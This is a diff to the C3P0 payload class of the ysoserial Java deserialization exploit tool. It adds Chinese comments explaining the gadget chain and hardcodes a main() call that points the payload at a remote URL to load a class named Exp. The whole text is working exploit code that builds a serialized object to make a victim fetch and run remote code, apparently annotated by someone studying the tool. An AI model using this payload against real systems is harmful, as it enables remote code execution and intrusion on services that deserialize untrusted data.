@@ -42,7 +42,9 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies( { "com.mchange:c3p0:0.9.5.2" ,"com.mchange:mchange-commons-java:0.2.11"} )
 @Authors({ Authors.MBECHLER })
 public class C3P0 implements ObjectPayload<Object> {
+    //c3p0主要是一个领用创建一个jndi的形式，再次反序列化其他pop链。二次反序列化。
     public Object getObject ( String command ) throws Exception {
+        /*PoolBackedDataSource为无readobject()，使用父类的readobject，先执行顶级父类的readobject()，再执行父类的readobject()*/
         int sep = command.lastIndexOf(':');
         if ( sep < 0 ) {
             throw new IllegalArgumentException("Command format is: <base_url>:<classname>");
@@ -52,7 +54,9 @@ public class C3P0 implements ObjectPayload<Object> {
         String className = command.substring(sep + 1);
 
         PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);
+        //初始化PoolBackedDataSource类
         Reflections.getField(PoolBackedDataSourceBase.class, "connectionPoolDataSource").set(b, new PoolSource(className, url));
+        //设置PoolBackedDataSource对象里的父类变量字段connectionPoolDataSource为new PoolSource(className, url)
         return b;
     }
 
@@ -85,7 +89,8 @@ public class C3P0 implements ObjectPayload<Object> {
 
 
     public static void main ( final String[] args ) throws Exception {
-        PayloadRunner.run(C3P0.class, args);
+        PayloadRunner.run(C3P0.class, new String[]{"http://www.baidu.com:Exp"});
+        /*使用的jndi的链接方式*/
     }
 
 }
